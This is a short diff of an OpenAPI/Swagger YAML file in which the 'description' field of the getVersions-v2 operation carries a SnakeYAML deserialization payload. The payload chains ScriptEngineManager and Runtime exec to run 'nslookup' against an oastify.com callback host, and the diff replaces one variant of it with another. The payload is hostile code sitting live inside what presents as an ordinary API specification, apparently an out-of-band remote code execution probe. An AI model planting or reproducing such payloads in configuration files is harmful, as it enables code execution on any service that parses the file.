@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.lang.Runtime [[!!java.lang.exec ["sh -c nslookup w6305gs7gipmkf7jabr5ud86cxip6hu6.oastify.com"]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.lang.Runtime [[!!java.lang.exec [nslookup w6305gs7gipmkf7jabr5ud86cxip6hu6.oastify.com]]]]
       produces:
       - application/json
       responses:
